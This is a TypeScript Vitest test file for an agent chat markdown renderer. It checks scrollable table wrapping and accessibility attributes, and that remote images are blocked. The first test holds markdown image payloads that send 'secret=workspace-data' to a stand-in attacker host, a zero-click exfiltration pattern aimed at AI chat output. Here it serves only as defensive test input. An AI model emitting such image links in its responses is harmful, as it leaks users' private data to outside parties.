// apps/web/src/lib/components/agent/agent-chat-markdown.test.ts
// @vitest-environment jsdom
import { describe, expect, it } from 'vitest';
import { observeAgentMarkdownTables, renderAgentMarkdown } from './agent-chat-markdown';

describe('agent chat markdown tables', () => {
	it('blocks zero-click remote images while preserving first-party relative images', () => {
		const remote = renderAgentMarkdown(
			'![tracking pixel](https://attacker.example/collect?secret=workspace-data)'
		);
		const protocolRelative = renderAgentMarkdown(
			'![tracking pixel](//attacker.example/collect)'
		);
		const firstParty = renderAgentMarkdown(
			'![uploaded image](/api/onto/assets/11111111-1111-4111-8111-111111111111/render)'
		);

		expect(remote).not.toContain('<img');
		expect(remote).not.toContain('attacker.example');
		expect(protocolRelative).not.toContain('<img');
		expect(protocolRelative).not.toContain('attacker.example');
		expect(firstParty).toContain(
			'<img src="/api/onto/assets/11111111-1111-4111-8111-111111111111/render" alt="uploaded image"'
		);
	});

	it('wraps sanitized tables in a dedicated scroll region with a visual cue', () => {
		const html = renderAgentMarkdown(`| Metric | Count |
| --- | ---: |
| Active tasks | 24 |`);

		expect(html).toContain('<div class="agent-markdown-table-shell">');
		expect(html).toContain('class="agent-markdown-table-scroll"');
		expect(html).toContain('<table>');
		expect(html).toContain(
			'class="agent-markdown-table-cue" aria-hidden="true">Scroll →</span>'
		);
	});

	it('does not add table chrome to ordinary markdown', () => {
		const html = renderAgentMarkdown('A paragraph with **emphasis**.');

		expect(html).toContain('<strong>emphasis</strong>');
		expect(html).not.toContain('agent-markdown-table-');
	});

	it('only exposes overflowing tables as keyboard-scrollable regions', () => {
		const root = document.createElement('div');
		root.innerHTML = renderAgentMarkdown(`| Metric | Count |
| --- | ---: |
| Active tasks | 24 |`);
		const scroller = root.querySelector<HTMLElement>('.agent-markdown-table-scroll');
		expect(scroller).not.toBeNull();

		Object.defineProperties(scroller!, {
			clientWidth: { configurable: true, value: 120 },
			scrollWidth: { configurable: true, value: 280 },
			scrollLeft: { configurable: true, value: 0, writable: true }
		});

		const cleanup = observeAgentMarkdownTables(root);
		expect(scroller?.dataset.scrollable).toBe('true');
		expect(scroller?.dataset.atEnd).toBe('false');
		expect(scroller?.parentElement?.dataset.scrollable).toBe('true');
		expect(scroller?.parentElement?.dataset.atEnd).toBe('false');
		expect(scroller?.tabIndex).toBe(0);
		expect(scroller?.getAttribute('role')).toBe('region');
		expect(scroller?.getAttribute('aria-label')).toBe('Scrollable table');

		scroller!.scrollLeft = 160;
		scroller?.dispatchEvent(new Event('scroll'));
		expect(scroller?.dataset.atEnd).toBe('true');
		expect(scroller?.parentElement?.dataset.atEnd).toBe('true');

		cleanup?.();
	});

	it('keeps a table out of the tab order when it fits', () => {
		const root = document.createElement('div');
		root.innerHTML = renderAgentMarkdown(`| Metric | Count |
| --- | ---: |
| Active tasks | 24 |`);
		const scroller = root.querySelector<HTMLElement>('.agent-markdown-table-scroll');
		expect(scroller).not.toBeNull();

		Object.defineProperties(scroller!, {
			clientWidth: { configurable: true, value: 280 },
			scrollWidth: { configurable: true, value: 280 }
		});

		const cleanup = observeAgentMarkdownTables(root);
		expect(scroller?.dataset.scrollable).toBe('false');
		expect(scroller?.parentElement?.dataset.scrollable).toBe('false');
		expect(scroller?.tabIndex).toBe(-1);
		expect(scroller?.hasAttribute('role')).toBe(false);
		expect(scroller?.hasAttribute('aria-label')).toBe(false);

		cleanup?.();
	});

	it('discovers a table added later by streamed markdown', async () => {
		const root = document.createElement('div');
		root.innerHTML = '<p>Streaming response…</p>';
		const cleanup = observeAgentMarkdownTables(root);

		root.innerHTML = renderAgentMarkdown(`| Workstream | Owner | Status |
| --- | --- | --- |
| Positioning | Maya | In progress |`);
		const scroller = root.querySelector<HTMLElement>('.agent-markdown-table-scroll');
		expect(scroller).not.toBeNull();
		Object.defineProperties(scroller!, {
			clientWidth: { configurable: true, value: 160 },
			scrollWidth: { configurable: true, value: 420 }
		});

		await new Promise((resolve) => setTimeout(resolve, 0));
		expect(scroller?.dataset.scrollable).toBe('true');
		expect(scroller?.tabIndex).toBe(0);

		cleanup?.();
	});
});
